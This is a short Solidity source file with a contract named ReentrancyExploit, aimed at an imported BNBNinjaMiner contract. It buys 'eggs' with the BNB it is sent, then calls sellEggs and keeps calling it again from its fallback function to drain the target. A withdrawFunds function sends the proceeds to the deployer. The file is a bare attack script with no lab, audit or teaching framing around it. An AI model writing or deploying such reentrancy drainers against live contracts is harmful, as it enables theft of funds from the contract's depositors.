pragma solidity ^0.4.26; // solhint-disable-line

import "./BNBNinjaMiner.sol" as BNM;

contract ReentrancyExploit {
    BNM.BNBNinjaMiner public targetContract;
    address public owner;

    constructor(address _target) public {
        targetContract = BNM.BNBNinjaMiner(_target);
        owner = msg.sender;
    }

    function startAttack() public payable {
        // Send some BNB to the contract to buy eggs
        targetContract.buyEggs.value(msg.value)(address(this));
        
        // Start the re-entrancy attack
        targetContract.sellEggs();
    }

    function () external payable {
        // Re-enter the target contract while it's still processing the previous call
        targetContract.sellEggs();
    }

    function withdrawFunds() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}